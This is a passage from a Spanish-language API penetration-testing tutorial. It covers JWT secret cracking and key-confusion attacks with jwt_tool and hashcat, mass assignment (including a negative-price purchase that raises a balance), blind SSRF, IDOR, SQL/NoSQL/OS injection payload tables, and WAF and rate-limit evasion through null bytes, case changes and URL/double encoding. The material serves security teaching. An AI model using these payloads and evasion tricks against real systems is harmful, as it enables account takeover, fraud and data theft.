HTTP response took about 10 seconds or more - could be a sign of a bug or vulnerability
jwttool_827e6eb062c12aa9c947a99719669d62 Injected kid claim - null-signed with blank kid Response Code: 200, 183 bytes
jwttool_1bdcd556fc0ea3ce33030df4bc910449 Injected kid claim - null-signed with kid="[path traversal]/dev/null" Response Code: 200, 183 bytes
jwttool_f10ff2ae68897292901004d1305033f4 Injected kid claim - null-signed with kid="/dev/null" Response Code: 200, 183 bytes
jwttool_cfd1577d61be5d05ba91a3d50d545450 Injected kid claim - null-signed with kid="/invalid_path" Response Code: 200, 183 bytes
jwttool_c57447e4fbfd40e1ca36d3872f46af48 Injected kid claim - RCE attempt - SLEEP 10 (did this request pause?) Response Code: 200, 183 bytes
jwttool_b6e3149438e0d65f12cf8246e7e0e1b3 Injected kid claim - signed with secret = '1' from SQLi Response Code: 200, 183 bytes
External service interactions not tested - enter listener URL into 'jwtconf.ini' to try this option
jwttool_0f77d33694f4b348597fc84c9bc5fb3d Checking for alternative accepted HMAC signatures, based on common passwords. Testing: secret Response Code: 200, 183 bytes
jwttool_35e44c13a0723ea69e5d308a2914db50 Checking for alternative accepted HMAC signatures, based on common passwords. Testing: ... Response Code: 200, 183 bytes
jwttool_d23210566f196b2500bf1de9f6b290c2 Checking for alternative accepted HMAC signatures, based on common passwords. Testing: 012345678901234567890123456789XY Response Code: 200, 183 bytes
jwttool_3dc0b1e62452946899a6363f4d29664a Checking for alternative accepted HMAC signatures, based on common passwords. Testing: 12345 Response Code: 200, 183 bytes
jwttool_1fc2664d7a2c2bde3121a98e9c3e5c9e Checking for alternative accepted HMAC signatures, based on common passwords. Testing: 12345678901234567890123456789012 Response Code: 200, 183 bytes
jwttool_8e143ee71909e3d5c406e8ac5c545b40 Checking for alternative accepted HMAC signatures, based on common passwords. Testing: 61306132616264382D363136322D343163332D383364362D316366353539623436616663 Response Code: 200, 183 bytes
jwttool_0031317809f722e03e1ce97816aa5a87 Checking for alternative accepted HMAC signatures, based on common passwords. Testing: 61306132616264382d363136322d343163332d383364362d316366353539623436616663 Response Code: 200, 183 bytes
jwttool_1a6eeb94bf4073fcb0afb09120535d95 Checking for alternative accepted HMAC signatures, based on common passwords. Testing: 872e4e50ce9990d8b041330c47c9ddd11bec6b503ae9386a99da8584e9bb12c4 Response Code: 200, 183 bytes
jwttool_31051075d6300794355cfae33a8db42b Checking for alternative accepted HMAC signatures, based on common passwords. Testing: 8zUpiGcaPkNhNGi8oyrq Response Code: 200, 183 bytes
jwttool_6957723473ed01e54ac4293019c26ffe Checking for alternative accepted HMAC signatures, based on common passwords. Testing: A43CC200A1BD292682598DA42DAA9FD14589F3D8BF832FFA206BE775259EE1EA Response Code: 200, 183 bytes
jwttool_6522969fb6d1adda5c1ca3a503dde15e Checking for alternative accepted HMAC signatures, based on common passwords. Testing: C2A4EB068AF8ABEF18D80B1689C7D785 Response Code: 200, 183 bytes
jwttool_8e7a564bfe329f280ee3a60e05f7492d Checking for alternative accepted HMAC signatures, based on common passwords. Testing: GQDstcKsx0NHjPOuXOYg5MbeJ1XT0uFiwDVvVBrk Response Code: 200, 183 bytes
jwttool_82ab65c906a15448597f20c6204d60a9 Checking for alternative accepted HMAC signatures, based on common passwords. Testing: Hello, World! Response Code: 200, 183 bytes
jwttool_dd4a6df19f60f945cf10f1e4dc1e14cd Checking for alternative accepted HMAC signatures, based on common passwords. Testing: J5hZTw1vtee0PGaoAuaW Response Code: 200, 183 bytes
jwttool_ebb4bda6fb472e06ff4f0b33489007da Checking for alternative accepted HMAC signatures, based on common passwords. Testing: [107 105 97 108 105] Response Code: 200, 183 bytes
jwttool_b5495b561b56badb5b4eafdabcc6ceb6 Checking for alternative accepted HMAC signatures, based on common passwords. Testing: kiali Response Code: 200, 183 bytes
jwttool_f7904e72a7897c71a5de2bed17cb46a3 Checking for alternative accepted HMAC signatures, based on common passwords. Testing: My super secret key! Response Code: 200, 183 bytes
jwttool_573b885f13c314ded6fe7111960cdc0d Checking for alternative accepted HMAC signatures, based on common passwords. Testing: Original secret string Response Code: 200, 183 bytes
jwttool_d5c7a8aaa6e811061a10338843423bff Checking for alternative accepted HMAC signatures, based on common passwords. Testing: R9MyWaEoyiMYViVWo8Fk4TUGWiSoaW6U1nOqXri8_XU Response Code: 200, 183 bytes
jwttool_1af18aeb0baa5d732a622360217a09c4 Checking for alternative accepted HMAC signatures, based on common passwords. Testing: RfxRP43BIKoSQ7P1GfeO Response Code: 200, 183 bytes
jwttool_ba1f6757395c661ef4cddf0da6733b42 Checking for alternative accepted HMAC signatures, based on common passwords. Testing: Secret key. You can use `mix guardian.gen.secret` to get one Response Code: 200, 183 bytes
jwttool_008afb42c8fbd6fbb95ec295bf55b98d Checking for alternative accepted HMAC signatures, based on common passwords. Testing: SecretKey Response Code: 200, 183 bytes
jwttool_46db6c4d627f239648038de91df1a615 Checking for alternative accepted HMAC signatures, based on common passwords. Testing: Setec Astronomy Response Code: 200, 183 bytes
jwttool_24a4a8564171bee7b7b677709f3ca758 Checking for alternative accepted HMAC signatures, based on common passwords. Testing: SignerTest Response Code: 200, 183 bytes
jwttool_e78b2da6d273cc657cd685a051f297d8 Checking for alternative accepted HMAC signatures, based on common passwords. Testing: Super Secret Key Response Code: 200, 183 bytes
jwttool_09426e0cd2a4097714d1dff84f1addc1 Checking for alternative accepted HMAC signatures, based on common passwords. Testing: THE_SAME_HMAC_KEY Response Code: 200, 183 bytes
jwttool_4c50b0c70aa06152bcc7431bd500622a Checking for alternative accepted HMAC signatures, based on common passwords. Testing: ThisIsMySuperSecret Response Code: 200, 183 bytes
jwttool_337b6463a9035111fefb3c6bebfabb51 Checking for alternative accepted HMAC signatures, based on common passwords. Testing: XYZ Response Code: 200, 183 bytes
jwttool_cace04aa0de9c735460a63afcfdbccd1 Checking for alternative accepted HMAC signatures, based on common passwords. Testing: YOUR_HMAC_KEY Response Code: 200, 183 bytes
jwttool_a8d17076ad7302554ea4f6704bb88a3e Checking for alternative accepted HMAC signatures, based on common passwords. Testing: YoUR sUpEr S3krEt 1337 HMAC kEy HeRE Response Code: 200, 183 bytes
jwttool_826b5f81c17561a37ee610b045bd7db7 Checking for alternative accepted HMAC signatures, based on common passwords. Testing: ]V@IaC1%fU,DrVI Response Code: 200, 183 bytes
jwttool_35f1803b613e492b66d8d2da5f5af6b5 Checking for alternative accepted HMAC signatures, based on common passwords. Testing: `mix guardian.gen.secret` Response Code: 200, 183 bytes
jwttool_a327445a4b26dae16c9f08c80e124fb2 Checking for alternative accepted HMAC signatures, based on common passwords. Testing: a43cc200a1bd292682598da42daa9fd14589f3d8bf832ffa206be775259ee1ea Response Code: 200, 183 bytes
jwttool_0cf38e4cd182bcc4cf4ab87267b08a1c Checking for alternative accepted HMAC signatures, based on common passwords. Testing: banana Response Code: 200, 183 bytes
jwttool_09eac010b2451e1d775777a4d0d81fb3 Checking for alternative accepted HMAC signatures, based on common passwords. Testing: bar Response Code: 200, 183 bytes
jwttool_c5e4709319f8f95b419af968cbddfb9b Checking for alternative accepted HMAC signatures, based on common passwords. Testing: c2a4eb068af8abef18d80b1689c7d785 Response Code: 200, 183 bytes

```

Parámetros usados

| Parámetro | Opción larga | Descripción |
|-----------|--------------|-------------|
| `-t` | `--target` | Define la URL del objetivo |
| `-rh` | `--headers` | Define las cabeceras HTTP que debes incluir en la solicitud |
| `-M` | `--mode` | Define el modo de operación de la herramienta (pb (Public Key Brute Forcing)) |



### Descifrando y Analizando Tokens JWT 

Los tokens JWT (JSON Web Tokens) son una parte esencial de la seguridad en aplicaciones web modernas. En los siguientes ejemplos, demostramos cómo las herramientas de línea de comandos pueden ser utilizadas para descifrar y analizar estos tokens. Con hashcat lo podremos realizar de la siguiente forma:

```bash
┌─[root@kali]─[/home/user/api]
└──╼ hashcat -m 16500 jwt.txt -a 0 -w 4 ../rockyou2021.txt               
```

Para el caso de ```jwt_tool``` para Fuerza Bruta en Tokens JWT se debe hacer lo siguiente:

```bash
┌─[root@kali]─[/home/user/api]
└──╼ ./jwt_tool.py <TOKEN> -C -d wordlist.txt               
```

El script de Python que se muestra a continuación, procesa un objeto JSON Web Key (JWK) y extrae la clave pública RSA. Esto es útil para obtener la clave pública de un servidor que utiliza tokens JWT para la autenticación.

```python
import json
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
import base64

# Aquí está tu objeto JSON
jwk = {
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "use": "sig",
      "kid": "MKMZkDenUfuDF2byYowDj7tW5Ox6XG4Y1THTEGScRg8",
      "alg": "RS256",
      "n": "sZKrGYja9S7BkO-waOcupoGY6BQjixJkg1Uitt278NbiCSnBRw5_cmfuWFFFPgRxabBZBJwJAujnQrlgTLXnRRItM9SRO884cEXn-s4Uc8qwk6pev63qb8no6aCVY0dFpthEGtOP-3KIJ2kx2i5HNzm8d7fG3ZswZrttDVbSSTy8UjPTOr4xVw1Yyh_GzGK9i_RYBWHftDsVfKrHcgGn1F_T6W0cgcnh4KFmbyOQ7dUy8Uc6Gu8JHeHJVt2vGcn50EDtUy2YN-UnZPjCSC7vYOfd5teUR_Bf4jg8GN6UnLbr_Et8HUnz9RFBLkPIf0NiY6iRjp9ooSDkml2OGql3ww"
    }
  ]
}

for key in jwk["keys"]:
    if key["kty"] == "RSA":
        e = base64.urlsafe_b64decode(key["e"] + '==')
        n = base64.urlsafe_b64decode(key["n"] + '==')

        e_long = int.from_bytes(e, byteorder='big')
        n_long = int.from_bytes(n, byteorder='big')

        public_numbers = RSAPublicNumbers(e_long, n_long)
        public_key = public_numbers.public_key(default_backend())

        pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        print(pem.decode())
   
```

Finalmente, se utiliza ```jwt_tool.py``` para manipular un token JWT, especificando un algoritmo (HS256) y una clave pública. Esta herramienta puede ser utilizada para probar la seguridad de los tokens JWT y explorar posibles vulnerabilidades. Dependiendo de las opciones adicionales y el contexto, esta manipulación puede variar desde simplemente decodificar y visualizar el token hasta intentar firmar el token con una clave pública específica (lo cual sería inusual con HS256, ya que normalmente utiliza una clave secreta).

```bash
┌─[root@kali]─[/home/user/api]
└──╼ ./jwt_tool.py eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2dWxuQGJydXRlLmNvbSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjg3MjMzNzIwLCJleHAiOjE2ODc4Mzg1MjB9.hdNMJ_TMh0F2Iawe5GT1fbniniPc-jV2q6umvDSa8fTC5TMNMzO-X9xIy6SBWU3gWaiLidGcJHixKLUgFOpPMvk0DzIVMQZNWjfp_w80nueVBnnav6X8vbHiWDdUKOTWogYDlZ5AJufgeLiQVQcJ-usTpdAH2u9TXRhW6HNKhflDxO5PyUsC3fYObxJl0xyR7L9jsuNr7gPkozk9oY52otTu3aCru8vBQM_D7B7CtBOFRTztxuZHy8z-dI6MSU2GdIF8Ko03EgBmRW-mAl_zFLr4dF2uAJL_LZUK1FfBtIgYbfqriK10ftOSNSiTvko50_5QsN1zib6E6Huthq2NUQ -S hs256 -k /home/nptg/Documents/API/public.pem              
```

### Mass Assignment

La vulnerabilidad de asignación masiva ocurre cuando una aplicación web asigna automáticamente valores de usuario a propiedades o variables sin una adecuada filtración o verificación. Este tipo de vulnerabilidad puede ser explotada por un atacante para modificar datos críticos o ganar acceso no autorizado.

Un ataque común de asignación masiva implica la inyección de parámetros inesperados en solicitudes, especialmente durante procesos como el registro de cuentas. Por ejemplo, un atacante podría agregar campos adicionales en una solicitud de registro, como:

```
"isadmin": true,
"isadmin":"true",
"admin": 1,
"admin": true, 
"role": admin,
```

[![apimass1](/images/apimass1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apimass1.png)

[![apimass2](/images/apimass2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apimass2.png)

Estos campos adicionales (```isadmin```, ```admin```, ```role```) están diseñados para manipular el modelo de datos de la aplicación, intentando otorgar privilegios de administrador al usuario recién creado. Si la aplicación es vulnerable a la asignación masiva, podría aceptar y procesar estos campos no autorizados. Como resultado, el atacante podría obtener privilegios elevados, como acceso a áreas administrativas o a datos sensibles de otros usuarios. Esto representa una seria amenaza para la seguridad de la aplicación y la privacidad de los datos.

> Lo mismo se podría aplicar en otros parámetros como "org" o el mismo "role", en que no siempre es necesario buscar el usuario administrador.


Otro ejemplo es el siguiente, en el que primero interceptamos la petición al comprar un artículo:

[![apimass3](/images/apimass3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apimass3.png)

[![apimass4](/images/apimass4.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apimass4.png)

Detectamos que los parámetros se pueden manipular en la petición a través del método ```POST```:

[![apimass5](/images/apimass5.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apimass5.png)

Al enviar esta nueva petición alterada, podremos apreciar como la respuesta es exitosa y vemos la publicación nueva en la página web y nos permite realizar la compra del artículo:

[![apimass6](/images/apimass6.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apimass6.png)

[![apimass7](/images/apimass7.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apimass7.png)

Incluso aplicando esta misma vulnerabilidad podremos cargar dinero alterando esta petición con un precio negativo de la siguiente forma:

[![apimass8](/images/apimass8.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apimass8.png)

Al darle a comprar veremos como nuestro saldo aumenta $1000.

[![apimass9](/images/apimass9.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apimass9.png)

[![apimass10](/images/apimass10.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apimass110.png)


### Blind SSRF

Hay dos tipos de vulnerabilidades SSRF, SSRF en banda y SSRF ciego. En Banda SSRF, significa que el servidor responde con los recursos especificados por el usuario final. Si el atacante especifica la carga útil como https://webhook.site/  a un servidor con una vulnerabilidad SSRF en banda, el servidor realizará la solicitud y responderá al atacante con la información proporcionada por https://webhook.site/. Blind SSRF tiene lugar cuando el atacante proporciona una URL y el servidor realiza la solicitud pero no envía información de la URL especificada al atacante. En el caso de Blind SSRF, necesitará un servidor web que capture la solicitud del objetivo para demostrar que obligó al servidor a realizar la solicitud.

En este caso, un atacante podría modificar la consulta para, en lugar de pedir datos de stock del producto, pedir los metadatos de la API y encontrar una lista de roles válidos. A continuación se expone un caso de SSRF:

[![apissrf4](/images/apissrf4.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apissrf4.png)

[![apissrf1](/images/apissrf1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apissrf1.png)

Cuando identificamos el parámetro inyectable procedemos a realizar la solicitud hacía la dirección de prueba de [webhook](https://webhook.site) y como se puede apreciar al enviar la petición recibimos como respuesta la información que dejamos previamente definido en [webhook](https://webhook.site).

[![apissrf3](/images/apissrf3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apissrf3.png)


### Broken Object Level Authorization (BOLA)

Esta es una vulnerabilidad también conocida como Insecure Direct Object Reference (IDOR) que permite solicitar datos de otros usuarios sin verificar de forma adecuada y segura que un usuario tenga propiedad y permiso para ver dicho recurso.

En este caso se identifica un parámetro ```report_id``` en donde podemos ver el reporte de un mecánico automotriz perteneciente a mi perfil.

[![api1](/images/api1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/api1.png)

[![api2](/images/api2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/api2.png)

Sin embargo cuando cambiamos el ```report_id``` a 2 por ejemplo, comenzamos a ver información de otros usuarios.

[![api3](/images/api3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/api3.png)

[![api4](/images/api4.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/api4.png)

De esta forma podemos ir iterando entre distintos valores para obtener más información de los usuarios.


### Inyecciones


Una "inyección" en el contexto de seguridad de la información se refiere a un tipo de vulnerabilidad de seguridad que permite a un atacante interferir con la estructura de una consulta o comando. Esto se hace inyectando datos maliciosos, que luego son procesados por el sistema como parte de una consulta o comando. Esto puede permitir a los atacantes realizar acciones no autorizadas, como acceder, modificar o eliminar datos, ejecutar comandos arbitrarios o incluso tomar el control de un sistema.

Estos son puntos potenciales de entrada que un atacante podría explotar. En este contexto, cada uno de estos "objetivos" representa un punto en el que la aplicación recibe datos de entrada del usuario que luego se procesan de alguna manera.

- **PUT videos por id**: Esta solicitud podría permitir a un atacante modificar videos existentes si pueden inyectar datos maliciosos en el `id` del video.
- **GET videos por id**: Similar a lo anterior, un atacante podría intentar acceder a videos que no deberían ser accesibles mediante la inyección de diferentes `ids`.
- **POST cambio-email, POST verificar-token-email, POST iniciar sesión, POST comprobar-otp**: Estas solicitudes están relacionadas con la autenticación del usuario y podrían permitir a un atacante obtener acceso no autorizado a las cuentas de los usuarios si pueden inyectar datos maliciosos.
- **GET ubicación**: Si la ubicación se basa en datos de entrada del usuario, podría ser posible inyectar datos maliciosos para obtener acceso a información de ubicación no autorizada.
- **POST publicaciones, POST validar-cupón, POST órdenes**: Estas solicitudes podrían permitir a un atacante crear, modificar o acceder a publicaciones, cupones u órdenes de maneras no autorizadas si pueden inyectar datos maliciosos.

En general, la idea detrás de seleccionar estos "objetivos" es identificar puntos donde los datos de entrada del usuario se procesan e intentar alterar ese procesamiento de formas que puedan ser útiles para un atacante. Es importante recordar que aunque una solicitud pueda ser un objetivo de inyección, eso no significa necesariamente que sea vulnerable. La identificación de objetivos de inyección es solo el primer paso en el proceso de evaluar y mejorar la seguridad de una aplicación.


#### SQL Injections

Este tipo de inyección ocurre cuando un atacante puede insertar o "inyectar" una consulta SQL a través de la entrada del usuario en una aplicación. Un atacante puede manipular la consulta para obtener datos no autorizados, modificar la base de datos o incluso ejecutar comandos de administración.

| Ejemplo             |
|---------------------|
| `'`                 |
| `''`                |
| `;%00`              |
| `--`                |
| `-- -`              |
| `""`                |
| `;`                 |
| `' OR '1`           |
| `' OR 1 -- -`       |
| `" OR "" = "`       |
| `" OR 1 = 1 -- -`   |
| `' OR '' = '`       |
| `OR 1=1`            |

#### NoSQL Injections

Similar a las inyecciones SQL, pero ocurren en bases de datos NoSQL. Debido a las diferencias en la estructura y el lenguaje de consulta entre SQL y NoSQL, las técnicas y payloads utilizados pueden variar.

| Ejemplo                    |
|----------------------------|
| `$gt`                      |
| `{"$gt":""}`               |
| `{"$gt":-1}`               |
| `$ne`                      |
| `{"$ne":""}`               |
| `{"$ne":-1}`               |
| `$nin`                     |
| `{"$nin":1}`               |
| `{"$nin":[1]}`             |
| `{"$where":  "sleep(1000)"}`|

#### OS Injections

Este tipo de inyección ocurre cuando un atacante puede inyectar comandos del sistema operativo a través de la entrada del usuario en una aplicación. Un atacante puede aprovechar esto para ejecutar comandos arbitrarios a nivel del sistema operativo. A los siguientes ejemplos se le deben seguir con comandos adicionales del sistema operativo respectivo.

| Ejemplo     |
|-------------|
| `|`         |
| `||`        |
| `&`         |
| `&&`        |
| `'`         |
| `"`         |
| `;`         |
| `'"`        |

#### Ejemplo

Tenemos un sitio web que nos permite acceder un cupón, luego interceptamos la petición y la enviamos al ` intruder` para hacer pruebas desde un diccionario que contiene inyecciones:

[![apiinjection1](/images/apiinjection1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apiinjection1.png)

[![apiinjection2](/images/apiinjection2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apiinjection2.png)

[![apiinjection3](/images/apiinjection3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apiinjection3.png)

Si alguna inyección es válida el código de estado que nos mostrará la respuesta será de 200, como se puede ver a continuación:

[![apiinjection4](/images/apiinjection4.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apiinjection4.png)

Finalmente verificamos el contenido de la respuesta para poder ver el cupón válido que pudimos conseguir por medio de la inyección NoSQL:

[![apiinjection5](/images/apiinjection5.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apiinjection5.png)
[![apiinjection6](/images/apiinjection6.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apiinjection6.png)

### Evasión de WAF

#### Terminadores de Cadena y Filtrado de Entradas

Los terminadores de cadena, como los bytes nulos y otros conjuntos de símbolos, a menudo se interpretan como señales para finalizar una cadena en muchos lenguajes de programación. Estos símbolos, si no se filtran adecuadamente, pueden anular los controles de seguridad de la API que se hayan implementado. En efecto, si puedes enviar con éxito un byte nulo, muchos lenguajes de programación de back-end lo interpretan como una señal para cesar el procesamiento. Esto puede resultar en la omisión de controles de seguridad si el byte nulo es procesado por una aplicación de back-end que valida la entrada del usuario, dado que el procesamiento de la entrada posterior se detiene.

Aquí se proporciona una lista de posibles terminadores de cadena para considerar:

- `%00`
- `0x00`
- `//`
- `;`
- `%`
- `!`
- `?`
- `[]`
- `%5B%5D`
- `%09`
- `%0a`
- `%0b`
- `%0c`
- `%0e`

Estos terminadores de cadena pueden insertarse en diferentes partes de la solicitud, como la ruta o el cuerpo POST, para intentar eludir las restricciones de seguridad existentes. Es importante recordar que el filtrado adecuado de estas entradas es crucial para mantener la seguridad y la integridad de la aplicación. Un ejemplo de su uso puede ser el siguiente:

```json
{
    "username": "admin",
    "password": "foo%00' OR '1'='1"
}
```

#### Eludiendo Limitaciones de Solicitudes con Cambio de Mayúsculas y Minúsculas

En ciertas aplicaciones web, los mecanismos de seguridad pueden ser susceptibles a técnicas tan sencillas como alterar las mayúsculas y minúsculas en las rutas de las solicitudes. Aunque, en teoría, las URL deberían ser insensibles a las mayúsculas y minúsculas, no todos los sistemas las tratan de la misma manera. Esto puede abrir la puerta a la evasión de ciertas restricciones de seguridad.

Considera el siguiente escenario: estamos probando la seguridad de una aplicación de redes sociales que impone un límite de 100 solicitudes por minuto a su API para prevenir abusos. Nos interesa el siguiente endpoint:

```bash
POST /api/miperfil
```

Y en el cuerpo de la solicitud, enviamos un uid:

```json
{
    "uid": "0001"
}
```

Queremos probar la robustez de este endpoint frente a ataques de fuerza bruta, probando todos los valores posibles para uid. Sin embargo, nos enfrentamos a la limitación de 100 solicitudes por minuto.


#### Estrategia de Cambio de Mayúsculas y Minúsculas

Para superar esta restricción, podríamos utilizar una técnica simple pero efectiva: cambiar las mayúsculas y minúsculas de la ruta de la URL. Si el servidor interpreta rutas con diferente uso de mayúsculas y minúsculas como diferentes, podríamos sortear el límite de solicitudes.

Por ejemplo:

```bash
POST /api/miPerfil
POST /api/Miperfil
POST /api/MIPERFIL
```

Cada una de estas rutas podría tener su propio límite de solicitudes, permitiéndonos enviar más solicitudes que las permitidas originalmente.

#### Automatización con Burp Suite

Podemos automatizar esta estrategia utilizando una herramienta como Burp Suite. En Burp Suite, configuraríamos el "Tipo de ataque" a "Pitchfork" y asociaríamos diferentes variantes de la URL con diferentes rangos de uid:

```yaml
POST /api/miperfil    emparejado con uid de 0001 a 0100
POST /api/miPerfil    emparejado con uid de 0101 a 0200
POST /api/MiPerfil    emparejado con uid de 0201 a 0300
```

Con este enfoque, podríamos probar todas las posibilidades de uid sin ser bloqueados por la limitación de solicitudes, lo que nos permitiría realizar una evaluación de seguridad más exhaustiva.


#### Codificación de Cargas Útiles para eludir WAFs

Los Firewalls de Aplicaciones Web (WAF) actúan como una capa de seguridad adicional para las aplicaciones web, bloqueando solicitudes maliciosas o sospechosas. Sin embargo, a veces estos WAF pueden ser eludidos usando técnicas como la codificación de cargas útiles.

La codificación de cargas útiles implica utilizar codificaciones (como la codificación URL, Base64, etc.) para disfrazar la carga útil de un ataque. Cuando una carga útil está codificada, los caracteres y cadenas que podrían haber disparado las reglas de un WAF se vuelven inofensivos desde la perspectiva del WAF.

#### Ejemplo de codificación simple

Considera la cadena `' OR 1=1 --` que es una carga útil común en los ataques de inyección SQL que intentan eludir la autenticación. Un WAF bien configurado bloqueará cualquier solicitud que contenga esta cadena. Pero si codificamos esta cadena usando codificación URL, obtenemos `%27%20OR%201%3D1%20--`, que puede pasar desapercibida por el WAF.

Si el sistema objetivo realiza una decodificación de URL en las solicitudes recibidas, entonces nuestra carga útil codificada `%27%20OR%201%3D1%20--` será decodificada de vuelta a `' OR 1=1 --` por el sistema objetivo y el ataque será exitoso, a pesar de la presencia del WAF.

Código:
Carga útil original: `' OR 1=1 --`
Carga útil codificada en URL: `%27%20OR%201%3D1%20--`


#### Ejemplo de doble codificación

También puedes intentar la doble codificación, donde codificas la carga útil dos veces. Algunos sistemas decodifican las solicitudes más de una vez, por lo que la doble codificación puede ayudar a eludir estas capas adicionales de seguridad.

Por ejemplo, la doble codificación de la URL de la carga útil `' OR 1=1 --` da como resultado `%2527%2520OR%25201%253D1%2520--`. Un sistema que decodifica dos veces la entrada la decodificará primero a `%27%20OR%201%3D1%20--` y luego a `' OR 1=1 --`.

Código:
Carga útil original: `' OR 1=1 --`
Carga útil con doble URL codificada: `%2527%2520OR%25201%253D1%2520--`

Recuerda que aunque estas técnicas pueden ser efectivas en algunos casos, no siempre funcionarán. La efectividad de estas técnicas dependerá de la configuración y las reglas del WAF, así como de cómo el sistema objetivo procesa y decodifica las solicitudes que recibe.

#### Utilizando Wfuzz para la Evasión de Controles de Seguridad

[Wfuzz](https://wfuzz.readthedocs.io/) es una potente herramienta que permite procesar y codificar cargas útiles de forma eficaz, resultando muy útil para sortear los Firewalls de Aplicaciones Web (WAFs) y otros controles de seguridad.

#### Identificando los Codificadores Disponibles

Para determinar qué codificadores están disponibles en Wfuzz, puedes ejecutar el siguiente comando:

```bash
┌─[root@kali]─[/home/user/api]
└──╼ wfuzz -e encoders
```

Este comando te proporcionará una lista de los codificadores disponibles, como:

- `base64`: Codifica la cadena dada usando base64.
- `urlencode`: Reemplaza caracteres especiales en cadenas usando el escape %xx.
- `random_upper`: Reemplaza caracteres aleatorios en cadenas con letras mayúsculas.
- `md5`: Aplica un hash MD5 a la cadena dada.
- `spell`: Convierte cada byte de datos a su correspondiente representación hexadecimal de dos dígitos.

#### Ejemplo de Uso de un Codificador

Para usar un codificador específico con Wfuzz, debes agregar una coma a la carga útil y especificar el nombre del codificador. A continuación, te presento un ejemplo que utiliza la codificación base64:

```bash
┌─[root@kali]─[/home/user/api]
└──╼ wfuzz -z file,wordlist/api/common.txt,base64 http://targetsite.com/FUZZ
```

En este ejemplo, cada carga útil se codificará en base64 antes de ser enviada en la solicitud.

#### Uso de Múltiples Codificadores

Wfuzz también permite usar múltiples codificadores en una misma carga útil. Para hacerlo, especifica los codificadores separándolos con un guión. Por ejemplo:

```bash
┌─[root@kali]─[/home/user/api]
└──╼ wfuzz -z list,TEST,base64-md5-none
```

Con este comando, recibirías una carga útil codificada en base64, otra carga útil con un hash MD5 y una última carga útil en su forma original (sin codificación). Si tuvieras tres cargas útiles y usaste tres codificadores, se enviarían un total de nueve solicitudes, como se muestra en el siguiente ejemplo:

```bash
┌─[root@kali]─[/home/user/api]
└──╼ wfuzz -z list,a-b-c,base64-md5-none -u http://targetsite.com/api/v2/FUZZ
```

Las respuestas podrían parecerse a algo como esto:

```makefile
000000002: 404 0 L 2 W 155 Ch "0cc175b9c0f1b6a831c399e269772661"
000000005: 404 0 L 2 W 155 Ch "92eb5ffee6ae2fec3ad71c777531578f"
000000008: 404 0 L 2 W 155 Ch "4a8a08f09d37b73795649038408b5f33"
000000004: 404 0 L 2 W 127 Ch "Yg=="
000000007: 404 0 L 2 W 127 Ch "Yw=="
000000001: 404 0 L 2 W 127 Ch "YQ=="
000000003: 404 0 L 2 W 124 Ch "a"
000000006: 404 0 L 2 W 124 Ch "b"
000000009: 404 0 L 2 W 124 Ch "c"
```

En este ejemplo, cada carga útil fue procesada tres veces en diferentes formas: una vez codificada en base64, una vez con un hash MD5 y una vez sin ninguna codificación. Así, la lista original de cargas útiles (a, b, c) resultó en 9 solicitudes diferentes.
